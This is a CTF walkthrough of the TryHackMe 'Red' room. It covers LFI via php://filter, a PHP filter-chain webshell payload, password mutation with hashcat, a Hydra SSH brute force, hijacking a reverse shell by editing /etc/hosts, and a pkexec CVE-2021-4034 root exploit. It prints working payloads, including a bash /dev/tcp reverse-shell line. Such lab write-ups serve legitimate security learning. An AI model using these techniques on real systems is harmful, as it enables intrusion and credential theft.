---
title: "Red"
date: 2025-02-16
slug: red
tags: [tryhackme, windows, web, privesc]
difficulty: Hard
---
https://tryhackme.com/room/redisl33t

IP = 10.10.98.188

1. Red has been known to kick adversaries out of the machine. Is there a way around it?  
2. Red likes to change adversaries' passwords but tends to keep them relatively the same.   
3. Red likes to taunt adversaries in order to throw off their focus. Keep your mind sharp!

---

**Enumeration**

```
❯ nmap -sCV 10.10.98.188

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:74:1c:e0:f7:86:4d:69:46:f6:5b:4d:be:c3:9f:76 (RSA)
|   256 fb:84:73:da:6c:fe:b9:19:5a:6c:65:4d:d1:72:3b:b0 (ECDSA)
|_  256 5e:37:75:fc:b3:64:e2:d8:d6:bc:9a:e6:7e:60:4d:3c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-title: Atlanta - Free business bootstrap template
|_Requested resource was /index.php?page=home.html
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


using gobuster 

```
❯ gobuster dir -u http://10.10.98.188 -w ~/ctf/wordlist/directory-list-2.3-medium.txt -x php,html,js,txt



/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/index.php            (Status: 302) [Size: 0] [--> /index.php?page=home.html]
/contact.html         (Status: 200) [Size: 7507]
/about.html           (Status: 200) [Size: 9309]
/home.html            (Status: 200) [Size: 15757]
/services.html        (Status: 200) [Size: 9131]
/signup.html          (Status: 200) [Size: 7283]
/assets               (Status: 301) [Size: 313] [--> http://10.10.98.188/assets/]
Progress: 2528 / 1102805 (0.23%)[ERROR] Get "http://10.10.98.188/videos.js": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/portfolio.html       (Status: 200) [Size: 14352]
/signin.html          (Status: 200) [Size: 6655]
/readme.txt           (Status: 200) [Size: 675]
```


index.php redirects to a page we can find some vulnerability here 
```
/index.php            (Status: 302) [Size: 0] [--> /index.php?page=home.html]
```



all have some static data but we can enum the script data to find any potential clues 

```
/contact.html         (Status: 200) [Size: 7507]
/about.html           (Status: 200) [Size: 9309]
/home.html            (Status: 200) [Size: 15757]
/services.html        (Status: 200) [Size: 9131]
/portfolio.html

```


this has a register form 
```
/signup.html          (Status: 200) [Size: 7283]
/signin.html
```

the home page redirects to 

`http://10.10.98.188/index.php?page=home.html`


here we pass a page parameer to the index.php and it redirects it to given page this thing is vulnerable to -- 
- Local File Inclusion (LFI)
- Directory Traversal
- Remote File Inclusion (RFI)  
- Error Disclosure 
- Potential Code Injection

---

**Exploitation**

LFI looks like the most valid one so I will try few LFI payloads 

used the tool LFIsuite 
https://github.com/D35m0nd142/LFISuite
but that didnt lead to anything 

here I did a mistake when i tried for directly scanning for LFI vulnerabilities without knowing what was in index.php because we cannot directly access index.php by the path but we can do it through curl (it was obvious that there is some filtering going in index.php)
we have used a wrapper to get the index.php src code 

wrappers - they are used to encode the file names into various filters(rot13,b64) and then request it from server to bypass the filtering 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md



```
curl http://10.10.98.188/index.php?page=php://filter/convert.base64-encode/resource=index.php -o index.php
```


```
❯ base64 -d index.php
<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>
```


we can see the filtering is going it will not let us out this directory or allow us running any file 

trying other possible types of input 
(used a payload tool **LFIsuite** and it detected a code injection onto this site)

*the tool found this it can be useful later* 
```
[+] The website seems to be vulnerable. Opening a Shell.. [If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),"content");] <?php system('whoami');?>@10.10.98.188:<?php system('pwd');?>$
```

IP changed => 10.10.212.91

using 

`http://10.10.212.91/index.php?page=php://filter/resource=/etc/passwd`


```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
blue:x:1000:1000:blue:/home/blue:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
red:x:1001:1001::/home/red:/bin/bash
```
2 users which are blue and red can be useful for ssh 
there was a clue for this challenge that the user red kicked out user blue by changing their password which can be helpful

https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html
shows how to get RCE using LFI 
using resources from [[LFI]]


using the code https://github.com/synacktiv/php_filter_chain_generator 
```
❯ python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]);?>'

[+] The following gadget chain will generate the following code : <?php system($_GET["c"]);?> (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOz8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-
......................................................
encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp

```

the command we passed into the temp file which is 
`<?php system($_GET["c"]);?>`
creates a variable c and accepts and run any commands given to it through link

used 
```
http://10.10.212.91/index.php?c=id&page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.U.........................
```
but that didnt work and gave up on this approach 

there is a .bash_history file present in the home directory which lets us see what commands we used from the user in the past because if user red has changed password for blue then we can get that 

using 
```
view-source:http://10.10.212.91/index.php?page=php://filter/resource=/home/blue/.bash_history
```

we got 

```
echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
```

we can see that user red used password in .reminder file and encrypted it with rules in file best64.rule 

we can get file using 
```
view-source:http://10.10.212.91/index.php?page=php://filter/resource=/home/blue/.reminder

sup3r_p@s$w0rd!
```

password was - sup3r_p@s$w0rd!

now using hashcat to create our own password file 

```
❯ ./hashcat --stdout ../../thm/pass -r rules/best64.rule > ../../thm/passlist.txt
❯ cat ../../thm/passlist.txt
sup3r_p@s$w0rd!
!dr0w$s@p_r3pus
SUP3R_P@S$W0RD!
Sup3r_p@s$w0rd!
sup3r_p@s$w0rd!0
sup3r_p@s$w0rd!1
sup3r_p@s$w0rd!2
sup3r_p@s$w0rd!3
sup3r_p@s$w0rd!4
sup3r_p@s$w0rd!77
sup3r_p@s$w0rd!88
sup3r_p@s$w0rd!99
sup3r_p@s$w0rd!123
sup3r_p@s$w0rd!e
sup3r_p@s$w0rd!s
sup3r_p@s$w0rda
sup3r_p@s$w0rs
sup3r_p@s$w0ra
sup3r_p@s$w0rer
sup3r_p@s$w0rie
sup3r_p@s$w0o
sup3r_p@s$w0y
sup3r_p@s$w0123
sup3r_p@s$w0man
sup3r_p@s$w0dog
1sup3r_p@s$w0rd!
thesup3r_p@s$w0rd!
dup3r_p@s$w0rd!
{up3r_p@s$w0rd!
v3r_p@s$w0rd!
sup3p@
suprsupr
3rs
suw0suw0
swp@
sup3rp
s_p@s$
```


then using hydra to brute force login to blue 
```
❯ hydra -l blue -P passlist.txt 10.10.212.91 ssh -t4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-16 15:30:43
[DATA] max 4 tasks per 1 server, overall 4 tasks, 78 login tries (l:1/p:78), ~20 tries per task
[DATA] attacking ssh://10.10.212.91:22/
[22][ssh] host: 10.10.212.91   login: blue   password: sup3r_p@s$w0rd!23
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-16 15:31:08
```

password found - sup3r_p@s$w0rd!23
uname - blue

logging in to ssh 
```
❯ ssh blue@10.10.212.91
blue@10.10.212.91's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-124-generic x86_64)

blue@red:~$  I recommend you leave Blue or I will destroy your shell
blue@red:~$ ls
flag1
blue@red:~$ cat flag1 
THM{Is_thAt_all_y0u_can_d0_blU3?}
```

---

**Privilege Escalation to Red**

while we are using the terminal we are getting messages on our terminal and also got kicked out and red changed my password again which means that red is using some scripts running as cronjobs which are vulnerable 
new password -  `sup3r_p@s$w0sup3r_p@s$w0`
always try to use hydra for regenerating password and getting in again and again to terminal
tried to make pty shell to escape this 

`python -c "import pty;pty.spawn('/bin/bash')"`

running pspy to check for cronjobs

```
❯ python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.212.91 - - [16/Feb/2025 15:55:45] "GET /pspy64 HTTP/1.1" 200 -
```


blue@red:/tmp$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

```

wget http://10.17.26.44:8000/pspy64




     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/02/16 10:28:57 CMD: UID=1000  PID=19643  | ./pspy64 
2025/02/16 10:28:57 CMD: UID=0     PID=19617  | 
2025/02/16 10:28:57 CMD: UID=1000  PID=19607  | -bash 
2025/02/16 10:28:57 CMD: UID=1000  PID=19606  | sshd: blue@pts/1     
2025/02/16 10:28:57 CMD: UID=0     PID=19518  | sshd: blue [priv]    
2025/02/16 10:28:57 CMD: UID=1001  PID=19511  | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
2025/02/16 10:28:57 CMD: UID=1000  PID=19362  | (sd-pam) 
2025/02/16 10:28:57 CMD: UID=1000  PID=19356  | /lib/systemd/systemd --user 
2025/02/16 10:28:57 CMD: UID=0     PID=19080  | 
2025/02/16 10:28:57 CMD: UID=0     PID=725    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2025/02/16 10:28:57 CMD: UID=0     PID=724    | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal 
2025/02/16 10:28:57 CMD: UID=0     PID=722    | /usr/lib/policykit-1/polkitd --no-debug 
2025/02/16 10:28:57 CMD: UID=0     PID=702    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2025/02/16 10:28:57 CMD: UID=0     PID=687    | /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220 
2025/02/16 10:28:57 CMD: UID=1     PID=677    | /usr/sbin/atd -f 
2025/02/16 10:28:57 CMD: UID=0     PID=674    | /usr/lib/udisks2/udisksd 
2025/02/16 10:28:57 CMD: UID=0     PID=672    | /lib/systemd/systemd-logind 
2025/02/16 10:28:57 CMD: UID=0     PID=669    | /usr/lib/snapd/snapd 
2025/02/16 10:28:57 CMD: UID=104   PID=664    | /usr/sbin/rsyslogd -n -iNONE 
2025/02/16 10:28:57 CMD: UID=0     PID=645    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
2025/02/16 10:28:57 CMD: UID=0     PID=644    | /usr/sbin/irqbalance --foreground 
2025/02/16 10:28:57 CMD: UID=103   PID=635    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2025/02/16 10:28:57 CMD: UID=0     PID=634    | /usr/sbin/cron -f 
2025/02/16 10:28:57 CMD: UID=0     PID=628    | /usr/bin/amazon-ssm-agent 
2025/02/16 10:28:57 CMD: UID=0     PID=627    | /usr/lib/accountsservice/accounts-daemon 
2025/02/16 10:28:57 CMD: UID=101   PID=615    | /lib/systemd/systemd-resolved 
2025/02/16 10:28:57 CMD: UID=100   PID=602    | /lib/systemd/systemd-networkd 
2025/02/16 10:28:57 CMD: UID=102   PID=566    | /lib/systemd/systemd-timesyncd 

2025/02/16 10:28:57 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity 
2025/02/16 10:29:01 CMD: UID=0     PID=19654  | /usr/sbin/CRON -f 
2025/02/16 10:29:01 CMD: UID=0     PID=19653  | /usr/sbin/CRON -f 
2025/02/16 10:29:01 CMD: UID=0     PID=19656  | /usr/bin/bash /root/defense/talk.sh 
2025/02/16 10:29:01 CMD: UID=0     PID=19655  | /bin/sh -c /usr/bin/bash /root/defense/talk.sh 
2025/02/16 10:29:01 CMD: UID=0     PID=19663  | awk {print $7} 
2025/02/16 10:29:01 CMD: UID=0     PID=19662  | grep -v root 
2025/02/16 10:29:01 CMD: UID=0     PID=19661  | /usr/bin/bash /root/defense/talk.sh 
2025/02/16 10:29:01 CMD: UID=0     PID=19660  | /usr/bin/bash /root/defense/talk.sh 
2025/02/16 10:29:01 CMD: UID=0     PID=19659  | /usr/sbin/CRON -f 
2025/02/16 10:29:01 CMD: UID=0     PID=19658  | ps aux 
2025/02/16 10:29:01 CMD: UID=0     PID=19657  | /usr/bin/bash /root/defense/talk.sh 
2025/02/16 10:29:01 CMD: UID=1001  PID=19667  | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
2025/02/16 10:29:01 CMD: UID=1001  PID=19666  | sh 
2025/02/16 10:29:01 CMD: UID=1001  PID=19668  | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
You really think you can take down my machine Blue?
2025/02/16 10:29:01 CMD: UID=0     PID=19669  | /usr/bin/echo You really think you can take down my machine Blue? 
2025/02/16 10:29:01 CMD: UID=0     PID=19670  | /usr/bin/bash /root/defense/talk.sh 

```

`2025/02/16 10:29:01 CMD: UID=1001  PID=19668  | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & `
we can see that red is using some reverse shell using hostname `redrules.thm`
we dont have any info for the hostname 

In linux there is a file which is /etc/host which stores name of the host and IP address associated with them 

blue@red:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm

```
blue@red:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm


# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouter

blue@red:~$ ls -l /etc/hosts
-rw-r--rw- 1 root adm 242 Feb 16 10:57 /etc/hosts


```

we can make changes to hostname so we can change the IP to our IP and it will try to make connection to out machine 
but we cant write to it 
we can append 

```
blue@red:~$ echo "10.17.26.44 redrules.thm" >> /etc/hosts
blue@red:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouter
10.17.26.44 redrules.thm
```

setting up listener 
```
❯ rlwrap nc -lnvp 9001
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.212.91.
Ncat: Connection from 10.10.212.91:42078.
bash: cannot set terminal process group (23165): Inappropriate ioctl for device
bash: no job control in this shell
red@red:~$ cat flag2
cat flag2
THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}

```

---

**Privilege Escalation to Root**

somehow when i try running `sudo -l` the terminal suddenly stops and i get logged out

```
red@red:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
chmod: changing permissions of 'linpeas.sh': Operation not permitted
```


```
red@red:/tmp$ find / -type f -perm -04000 -ls 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null
   418507     32 -rwsr-xr-x   1 root     root        31032 Aug 14  2022 /home/red/.git/pkexec
   133900     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
   134476     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   138701     24 -rwsr-xr-x   1 root     root          22840 May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1
   160971    464 -rwsr-xr-x   1 root     root         473576 Mar 30  2022 /usr/lib/openssh/ssh-keysign
   132809    140 -rwsr-xr-x   1 root     root         142792 Nov 28  2022 /usr/lib/snapd/snap-confine
   133008     56 -rwsr-sr-x   1 daemon   daemon        55560 Nov 12  2018 /usr/bin/at
   134441     68 -rwsr-xr-x   1 root     root          68208 Nov 29  2022 /usr/bin/passwd
   134427     84 -rwsr-xr-x   1 root     root          85064 Nov 29  2022 /usr/bin/chfn
   134327    164 -rwsr-xr-x   1 root     root         166056 Jan 16  2023 /usr/bin/sudo
   133189     40 -rwsr-xr-x   1 root     root          39144 Mar  7  2020 /usr/bin/fusermount
   134436     52 -rwsr-xr-x   1 root     root          53040 Nov 29  2022 /usr/bin/chsh
   133399     44 -rwsr-xr-x   1 root     root          44784 Nov 29  2022 /usr/bin/newgrp
   133341     56 -rwsr-xr-x   1 root     root          55528 Feb  7  2022 /usr/bin/mount
   133685     40 -rwsr-xr-x   1 root     root          39144 Feb  7  2022 /usr/bin/umount
   134439     88 -rwsr-xr-x   1 root     root          88464 Nov 29  2022 /usr/bin/gpasswd
   133613     68 -rwsr-xr-x   1 root     root          67816 Feb  7  2022 /usr/bin/su
      297    129 -rwsr-xr-x   1 root     root         131832 Mar 29  2023 /snap/snapd/18933/usr/lib/snapd/snap-confine
      139    121 -rwsr-xr-x   1 root     root         123560 Feb 22  2023 /snap/snapd/18596/usr/lib/snapd/snap-confine
      815     84 -rwsr-xr-x   1 root     root          85064 Nov 29  2022 /snap/core20/1828/usr/bin/chfn
      821     52 -rwsr-xr-x   1 root     root          53040 Nov 29  2022 /snap/core20/1828/usr/bin/chsh
      890     87 -rwsr-xr-x   1 root     root          88464 Nov 29  2022 /snap/core20/1828/usr/bin/gpasswd
      974     55 -rwsr-xr-x   1 root     root          55528 Feb  7  2022 /snap/core20/1828/usr/bin/mount
      983     44 -rwsr-xr-x   1 root     root          44784 Nov 29  2022 /snap/core20/1828/usr/bin/newgrp
      998     67 -rwsr-xr-x   1 root     root          68208 Nov 29  2022 /snap/core20/1828/usr/bin/passwd
     1108     67 -rwsr-xr-x   1 root     root          67816 Feb  7  2022 /snap/core20/1828/usr/bin/su
     1109    163 -rwsr-xr-x   1 root     root         166056 Jan 16  2023 /snap/core20/1828/usr/bin/sudo
     1167     39 -rwsr-xr-x   1 root     root          39144 Feb  7  2022 /snap/core20/1828/usr/bin/umount
     1256     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1628    463 -rwsr-xr-x   1 root     root              473576 Mar 30  2022 /snap/core20/1828/usr/lib/openssh/ssh-keysign
      816     84 -rwsr-xr-x   1 root     root               85064 Nov 29  2022 /snap/core20/1852/usr/bin/chfn
      822     52 -rwsr-xr-x   1 root     root               53040 Nov 29  2022 /snap/core20/1852/usr/bin/chsh
      891     87 -rwsr-xr-x   1 root     root               88464 Nov 29  2022 /snap/core20/1852/usr/bin/gpasswd
      975     55 -rwsr-xr-x   1 root     root               55528 Feb  7  2022 /snap/core20/1852/usr/bin/mount
      984     44 -rwsr-xr-x   1 root     root               44784 Nov 29  2022 /snap/core20/1852/usr/bin/newgrp
      999     67 -rwsr-xr-x   1 root     root               68208 Nov 29  2022 /snap/core20/1852/usr/bin/passwd
     1109     67 -rwsr-xr-x   1 root     root               67816 Feb  7  2022 /snap/core20/1852/usr/bin/su
     1110    163 -rwsr-xr-x   1 root     root              166056 Jan 16  2023 /snap/core20/1852/usr/bin/sudo
     1168     39 -rwsr-xr-x   1 root     root               39144 Feb  7  2022 /snap/core20/1852/usr/bin/umount
     1257     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/1852/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1629    463 -rwsr-xr-x   1 root     root              473576 Mar 30  2022 /snap/core20/1852/usr/lib/openssh/ssh-keysign
red@red:/tmp$ 
```

`find / -type f -perm -04000 -ls 2>/dev/null`
this is a privesc command which 
"finds files in the root directory with perm SUID and lists them"

in the given list only one entry sticks out which is 
`  418507     32 -rwsr-xr-x   1 root     root        31032 Aug 14  2022 /home/red/.git/pkexec`

**pkexec** allows an authorized user to execute PROGRAM as another user

```
red@red:~/.git$ ./pkexec --version
./pkexec --version
pkexec version 0.105
```


checking for a exploit online and found 
https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py



```
red@red:/tmp$ wget http://10.17.26.44:8000/CVE-2021-4034.py
wget http://10.17.26.44:8000/CVE-2021-4034.py
--2025-02-16 13:29:54--  http://10.17.26.44:8000/CVE-2021-4034.py
Connecting to 10.17.26.44:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3268 (3.2K) [text/x-python]
Saving to: ‘CVE-2021-4034.py’

CVE-2021-4034.py    100%[===================>]   3.19K  --.-KB/s    in 0s      

2025-02-16 13:29:55 (264 MB/s) - ‘CVE-2021-4034.py’ saved [3268/3268]

red@red:/tmp$ ls
ls
CVE-2021-4034.py
linpeas.sh
pspy64
snap-private-tmp
systemd-private-1b1dd763d1fe4d64ac93b68ca635912f-apache2.service-TOfaJi
systemd-private-1b1dd763d1fe4d64ac93b68ca635912f-systemd-logind.service-qtg0vf
systemd-private-1b1dd763d1fe4d64ac93b68ca635912f-systemd-resolved.service-16JqRg
systemd-private-1b1dd763d1fe4d64ac93b68ca635912f-systemd-timesyncd.service-0fz1Hi
red@red:/tmp$ python3 CVE-2021-4034.py
python3 CVE-2021-4034.py
[+] Creating shared library for exploit code.
[+] Calling execve()
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
defense  flag3	snap
# cat flag3
cat flag3
THM{Go0d_Gam3_Blu3_GG}

```






---
**Learnings**
- usage of php wrappers 
- read and understand properly what the clues are pointing towards (.bash_history) can also be used for priv esc 
- when the shell is against you their may be cronjobs running 
- few binaries can be preinstalled in the machine for which we can find exploit online to get root access also know the version of the binary to get the correct exploit
